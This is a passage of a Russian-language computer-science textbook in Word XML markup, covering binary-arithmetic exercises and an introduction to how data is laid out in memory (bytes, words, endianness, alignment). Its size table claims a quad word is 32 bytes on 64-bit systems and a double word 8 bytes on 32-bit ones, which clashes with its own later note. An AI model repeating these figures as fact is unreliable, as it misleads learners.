        <w:t>**Выполните умножение**: 1101₂ × 101₂. Сколько промежуточных произведений вы получили?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните своими словами**, почему при сложении 1 + 1 в двоичной системе получается 10? Как это связано с основанием системы счисления?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: Процессор выполняет сложение двух 8-битных чисел: 11110000₂ + 00011111₂. Каков будет результат? Произойдёт ли переполнение?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Материал этой главы является основой для изучения следующих тем:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.11 (Системы счисления)**: Перевод между различными системами счисления, связь двоичной, восьмеричной и шестнадцатеричной систем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.9 (Представление числовых данных)**: Форматы хранения целых чисел со знаком, дополнительный код</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1 (Архитектура ЭВМ)**: Устройство арифметико-логического устройства (АЛУ) процессора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили основы арифметики в двоичной системе счисления:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Правила сложения двоичных чисел и механизм переноса разрядов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Алгоритм вычитания с использованием заёмов из старших разрядов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Метод умножения двоичных чисел «столбиком»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Деление двоичных чисел «уголком»</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Практические применения двоичной арифметики в вычислительной технике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы умеете:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выполнять все четыре основные арифметические операции с двоичными числами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Правильно обрабатывать переносы и заёмы разрядов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверять корректность результатов через перевод в десятичную систему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понимать, как компьютер выполняет арифметические вычисления на аппаратном уровне</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти знания критически важны для понимания работы процессора, оптимизации программ и изучения низкоуровневого программирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Объем главы: ~10500 символов_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.2: Представление данных в памяти ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В предыдущей главе мы рассмотрели арифметику в двоичной системе счисления — фундаментальную основу работы с данными в компьютерах. Теперь настало время разобраться, как эти двоичные числа и другие типы информации физически организованы и хранятся в оперативной памяти электронно-вычислительных машин.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание организации памяти критически важно для любого специалиста в области информационных технологий. Это знание позволяет не только эффективно программировать, но и понимать принципы работы операционных систем, баз данных, сетевых протоколов. Кроме того, представление данных напрямую влияет на производительность программ, размер занимаемой памяти и возможности по обработке информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Данная глава тесно связана с темами архитектуры ЭВМ (глава 2.1), представления числовых данных (глава 1.9), а также с темами представления символьных, графических и звуковых данных (главы 1.4, 1.8, 1.3). Здесь мы заложим общие принципы, которые будут детализированы в последующих разделах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Иерархическая структура памяти ЭВМ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Понятие оперативной памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оперативная память</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ОЗУ — оперативное запоминающее устройство, англ. RAM — Random Access Memory) представляет собой быстродействующую энергозависимую память компьютера, предназначенную для временного хранения данных и программ в процессе их выполнения. Основное свойство оперативной памяти — возможность прямого доступа к любой ячейке за одинаковое время, независимо от её расположения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Память организована как линейная последовательность </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ячеек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, каждая из которых имеет уникальный </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адрес</w:t>
      </w:r>
      <w:r>
        <w:t>. Эта организация похожа на многоэтажный дом, где каждая квартира имеет свой номер, по которому можно однозначно её идентифицировать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Минимальная адресуемая единица: байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Исторически сложилось, что минимальной адресуемой единицей памяти в современных компьютерах является </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>байт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. byte) — группа из 8 бит. Это означает, что каждый байт памяти имеет свой уникальный адрес, и процессор может обращаться к памяти с точностью до байта.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему именно 8 бит?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Это исторический стандарт, обусловленный тем, что 8 бит достаточно для представления одного символа в большинстве систем кодирования (например, ASCII использует 7 бит, расширенные кодировки — 8 бит).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Байт (8 бит):  [b₇][b₆][b₅][b₄][b₃][b₂][b₁][b₀]</w:t>
        <w:br/>
        <w:t xml:space="preserve">                 ↑                             ↑</w:t>
        <w:br/>
        <w:t xml:space="preserve">            старший бит               младший бит</w:t>
        <w:br/>
        <w:t xml:space="preserve">                (MSB)                      (LSB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Один байт может представлять:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Целое число без знака от 0 до 255 (2⁸ = 256 значений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Целое число со знаком от -128 до +127</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один символ в кодировке ASCII или Latin-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Часть более сложного типа данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Более крупные единицы: слово, двойное слово, четверное слово</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для эффективной работы процессоры обычно оперируют более крупными порциями данных:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Слово</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. word) — базовая единица данных, обрабатываемая процессором за одну операцию. Размер слова зависит от архитектуры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16-разрядные системы: слово = 2 байта = 16 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>32-разрядные системы: слово = 4 байта = 32 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>64-разрядные системы: слово = 8 байт = 64 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Двойное слово</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. double word, dword) — удвоенный размер базового слова:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 16-разрядных системах: 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 32-разрядных системах: 8 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Четверное слово</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (англ. quad word, qword) — учетверенный размер:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 32-разрядных системах: 16 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В 64-разрядных системах: 32 байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: в современной литературе термин "слово" часто используется для обозначения 2-байтной величины (16 бит), а "двойное слово" — для 4 байт (32 бита), независимо от разрядности процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Адресация памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Понятие адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это целое неотрицательное число, однозначно идентифицирующее конкретную ячейку (байт) в оперативной памяти. Адресация начинается с нуля: первый байт имеет адрес 0, второй — адрес 1, и так далее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Размер адресного пространства определяется разрядностью адресной шины процессора:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>16-разрядная шина: 2¹⁶ = 65 536 адресов = 64 КБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>32-разрядная шина: 2³² = 4 294 967 296 адресов = 4 ГБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>64-разрядная шина: 2⁶⁴ ≈ 18,4 эксабайта (теоретически)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Порядок байтов: Little Endian и Big Endian</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При хранении многобайтовых данных (например, 32-битного целого числа) возникает вопрос: в каком порядке располагать байты в памяти? Существуют два основных подхода:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Little Endian</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (младший байт первым):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Младший байт располагается по младшему адресу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в архитектурах x86, x86-64 (процессоры Intel, AMD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Big Endian</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (старший байт первым):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старший байт располагается по младшему адресу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в некоторых архитектурах (например, классические SPARC, PowerPC в режиме big endian)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Соответствует естественной записи чисел (слева направо, от старшего к младшему)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Представление числа в памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Рассмотрим 32-битное целое число 0x12345678 (в шестнадцатеричной системе). Как оно будет храниться в памяти, начиная с адреса 1000, в форматах Little Endian и Big Endian?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представим число побайтово:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Байт 3 (старший): 0x12</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Байт 2: 0x34</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Байт 1: 0x56</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Байт 0 (младший): 0x78</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Little Endian</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (x86):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Адрес:  1000  1001  1002  1003</w:t>
        <w:br/>
        <w:t>Байты:  0x78  0x56  0x34  0x12</w:t>
        <w:br/>
        <w:t xml:space="preserve">         ↑                   ↑</w:t>
        <w:br/>
        <w:t xml:space="preserve">    младший              старший</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Big Endian</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Адрес:  1000  1001  1002  1003</w:t>
        <w:br/>
        <w:t>Байты:  0x12  0x34  0x56  0x78</w:t>
        <w:br/>
        <w:t xml:space="preserve">         ↑                   ↑</w:t>
        <w:br/>
        <w:t xml:space="preserve">    старший              младший</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое значение</w:t>
      </w:r>
      <w:r>
        <w:t>: Различие в порядке байтов критично при обмене данными между системами с разной архитектурой (например, в сетевых протоколах). Сетевой порядок байтов (network byte order) — это Big Endian.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Типы данных и их представление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Классификация типов данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В памяти ЭВМ могут храниться данные различных типов, каждый из которых имеет свой способ представления:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Целочисленные типы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Беззнаковые целые (unsigned): только положительные числа и ноль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Знаковые целые (signed): положительные и отрицательные числа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размеры: 8, 16, 32, 64 бита и более</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вещественные типы** (числа с плавающей точкой):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одинарная точность (float): 32 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Двойная точность (double): 64 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расширенная точность: 80, 128 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Символьные типы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ASCII-символы: 8 бит (1 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Unicode символы: 16 или 32 бита (UTF-16, UTF-32)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Логический тип** (boolean):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обычно занимает 1 байт (хотя логически нужен 1 бит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Составные типы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строки (последовательности символов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Массивы (последовательности однотипных элементов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Структуры и записи (группы разнотипных данных)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Указатели (адреса ячеек памяти)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Выравнивание данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выравнивание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (alignment) — это размещение данных в памяти по адресам, кратным размеру данных или степени двойки. Например, 4-байтовое целое число предпочтительно размещать по адресу, кратному 4.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Причины выравнивания</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Увеличение производительности: процессор быстрее читает выровненные данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Архитектурные требования: некоторые процессоры не могут читать невыравненные данные или делают это медленно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Атомарность операций: выровненные данные можно атомарно читать/записывать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Выравнивание структуры в памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Рассмотрим структуру данных:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>struct Example {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    char  a;    // 1 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int   b;    // 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    char  c;    // 1 байт</w:t>
        <w:br/>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Какой размер будет занимать эта структура в памяти с учётом выравнивания?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Наивный подсчёт: 1 + 4 + 1 = 6 байт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>С учётом выравнивания по 4-байтовой границе:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Смещение: 0    1    2    3    4    5    6    7    8    9   10   11</w:t>
        <w:br/>
        <w:t>Данные:  [a] [pad][pad][pad][ b  ][ b  ][ b  ][ b  ][c] [pad][pad][pad]</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↑                   ↑                   ↑</w:t>
        <w:br/>
        <w:t xml:space="preserve">        char                 int                 char</w:t>
        <w:br/>
        <w:br/>
        <w:t>Размер: 12 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`a` занимает байт 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3 байта паддинга (1-3), чтобы `b` начинался с адреса, кратного 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`b` занимает байты 4-7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`c` занимает байт 8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3 байта паддинга в конце (9-11), чтобы размер всей структуры был кратен 4</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое значение</w:t>
      </w:r>
      <w:r>
        <w:t>: Неоптимальное расположение полей в структуре может привести к увеличению расхода памяти. Переупорядочение полей по убыванию размера часто помогает минимизировать паддинг.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Организация многомерных массивов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Одномерные массивы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Одномерный массив</w:t>
      </w:r>
      <w:r>
